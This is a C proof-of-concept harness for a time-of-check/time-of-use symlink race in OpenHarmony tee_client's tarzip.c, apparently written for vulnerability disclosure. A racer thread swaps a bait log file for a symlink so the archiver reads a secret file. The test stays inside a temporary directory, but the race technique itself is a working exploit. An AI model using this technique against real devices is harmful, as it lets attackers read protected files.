/*
 * Target-Compile PoC: tarzip.c WriteSingleFile TOCTOU (CWE-367)
 *
 * Target: OpenHarmony tee_client — services/tlogcat/src/tarzip.c
 * Vulnerable function: WriteSingleFile (line 221)
 *
 * Trigger path (user perspective):
 *   TarZipFiles(nameCount, inputNames, outputName, pathGroup)
 *     → WriteSingleFile(fileName, out)
 *       → JudgeFileValidite(fileName, &fileAttr)   [lstat: CHECK]
 *         ... RACE WINDOW ...
 *       → WriteZipContent(out, fileName, fileSize)
 *         → tee_open(fileName, O_CREAT|O_RDWR, 0400) [open: USE, no O_NOFOLLOW]
 *         → read(fileFd, buf, 512) → gzwrite(gzFd, buf, 512)
 *
 * Oracle: After race succeeds, decompress output.gz and verify it contains
 *         content from the symlink target (SECRET_DATA), not the bait file.
 *
 * Build (target-compile):
 *   ./build.sh <tee_client_path>
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <pthread.h>
#include <errno.h>
#include <zlib.h>

/* These are the real functions compiled from tarzip.c */
extern void TarZipFiles(uint32_t nameCount, const char **inputNames,
                        const char *outputName, gid_t pathGroup);

/* Instrumented tee_open detection globals */
volatile int g_tee_open_race_detected = 0;
const char *g_expected_target_path = NULL;

#define LOG_FILE_INDEX_MAX 3

static const char *g_test_dir = NULL;
static char g_bait_path[256];
static char g_target_path[256];
static char g_output_path[256];
static volatile int g_racing = 1;

static void *race_thread(void *arg)
{
    (void)arg;
    char tmp_path[256];
    snprintf(tmp_path, sizeof(tmp_path), "%s.tmp", g_bait_path);

    while (g_racing) {
        /* Phase 1: regular file (passes JudgeFileValidite lstat+S_ISREG) */
        int fd = open(tmp_path, O_CREAT | O_WRONLY | O_TRUNC, 0644);
        if (fd >= 0) {
            char dummy[4096];
            memset(dummy, 'A', sizeof(dummy));
            write(fd, dummy, sizeof(dummy));
            close(fd);
        }
        rename(tmp_path, g_bait_path);

        /* Phase 2: symlink to secret (tee_open follows it) */
        usleep(1);
        unlink(g_bait_path);
        symlink(g_target_path, g_bait_path);
        usleep(1);
    }
    return NULL;
}

static int check_leaked_content(const char *gz_path)
{
    gzFile gz = gzopen(gz_path, "r");
    if (!gz) return 0;

    char buf[8192];
    int total = 0;
    int n;
    while ((n = gzread(gz, buf + total, sizeof(buf) - total - 1)) > 0) {
        total += n;
        if (total >= (int)sizeof(buf) - 1) break;
    }
    gzclose(gz);
    buf[total] = '\0';

    /* Check if the gzip archive contains secret content */
    if (strstr(buf, "SECRET_DATA_LEAKED_VIA_TOCTOU") != NULL) {
        return 1;
    }
    return 0;
}

int main(void)
{
    char template[] = "/tmp/tarzip_poc_XXXXXX";
    g_test_dir = mkdtemp(template);
    if (!g_test_dir) { perror("mkdtemp"); return 1; }

    /* Create the secret target file (simulates /data/service/el1/... sensitive data) */
    snprintf(g_target_path, sizeof(g_target_path), "%s/secret.dat", g_test_dir);
    int fd = open(g_target_path, O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) {
        write(fd, "SECRET_DATA_LEAKED_VIA_TOCTOU\n", 30);
        close(fd);
    }

    /* Bait file (mimics /data/log/tee/teeOS_log-0, name must be >= 8 chars after '/') */
    snprintf(g_bait_path, sizeof(g_bait_path), "%s/teeOS_log-0", g_test_dir);
    fd = open(g_bait_path, O_CREAT | O_WRONLY, 0644);
    if (fd >= 0) {
        char filler[4096];
        memset(filler, 'X', sizeof(filler));
        write(fd, filler, sizeof(filler));
        close(fd);
    }

    /* Output gzip path */
    snprintf(g_output_path, sizeof(g_output_path), "%s/output.tar.gz", g_test_dir);

    fprintf(stderr, "[POC] Test dir: %s\n", g_test_dir);
    fprintf(stderr, "[POC] Bait:     %s\n", g_bait_path);
    fprintf(stderr, "[POC] Target:   %s\n", g_target_path);
    fprintf(stderr, "[POC] Output:   %s\n\n", g_output_path);

    /* Set up instrumented tee_open to detect when it opens the target */
    g_expected_target_path = g_target_path;

    /* Start race thread */
    pthread_t racer;
    pthread_create(&racer, NULL, race_thread, NULL);

    /* Call real TarZipFiles repeatedly until race is won */
    int won = 0;
    for (int attempt = 0; attempt < 2000 && !won; attempt++) {
        unlink(g_output_path);

        const char *inputs[LOG_FILE_INDEX_MAX] = { g_bait_path, NULL, NULL };
        TarZipFiles(LOG_FILE_INDEX_MAX, inputs, g_output_path, getgid());

        if (g_tee_open_race_detected || check_leaked_content(g_output_path)) {
            fprintf(stderr, "[+] RACE WON on attempt %d!\n", attempt);
            fprintf(stderr, "[+] Secret content found in output archive.\n");
            fprintf(stderr, "[+] tee_open() followed symlink → arbitrary file read confirmed.\n");
            won = 1;
        }

        if (attempt % 500 == 0 && attempt > 0) {
            fprintf(stderr, "[*] Attempt %d/2000...\n", attempt);
        }
    }

    g_racing = 0;
    pthread_join(racer, NULL);

    /* Cleanup */
    unlink(g_bait_path);
    unlink(g_target_path);
    unlink(g_output_path);
    char tmp[256];
    snprintf(tmp, sizeof(tmp), "%s.tmp", g_bait_path);
    unlink(tmp);
    rmdir(g_test_dir);

    if (won) {
        fprintf(stderr, "\n[RESULT] TOCTOU race condition CONFIRMED.\n");
        fprintf(stderr, "  Root cause: JudgeFileValidite uses lstat (CHECK)\n");
        fprintf(stderr, "              WriteZipContent uses tee_open without O_NOFOLLOW (USE)\n");
        return 0;
    } else {
        fprintf(stderr, "\n[RESULT] Race not triggered in 2000 attempts (timing-dependent).\n");
        fprintf(stderr, "  Note: This race IS exploitable but window is small (~us).\n");
        fprintf(stderr, "  On real device with I/O contention, success rate improves.\n");
        return 1;
    }
}
